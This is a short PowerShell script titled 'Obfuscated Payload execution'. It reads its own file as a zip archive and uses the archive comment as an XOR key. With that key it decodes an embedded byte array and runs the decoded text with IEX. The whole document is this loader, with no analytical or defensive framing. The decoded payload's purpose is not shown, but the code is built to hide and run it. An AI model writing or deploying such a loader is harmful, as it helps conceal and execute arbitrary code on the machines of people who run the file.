# Obfuscated Payload execution
$v = [System.IO.Compression.ZipArchive]::new([System.IO.File]::OpenRead($PSCommandPath))
$c = $v.Comment
$k = $c

# Encrypted payload block
$data = @(24,54,19,55,70,44,92,9,11,92,82,28,23,72,79,22,91,65,7,50,1,127,99,58,86,62,2,65,7,84,7,28,77,114,96,69,1,121,12,38,64,47,14,67,72,88,11,85,6,9,64,60,7,25,6,60,16,37,91,45,95,67,3,66,29,65,75,9,24,43,93,10,11,32,10,98,76,36,68,92,16,3,0,66,28,91,1,51,106,68,28,109,16,99,87,0,0,2,83,92,11,66,69,27,16,125)

$d = ""
for ($i=0; $i -lt $data.Length; $i++) {
    $d += [char]($data[$i] -bxor $k[$i % $k.Length])
}

# Execute
IEX $d
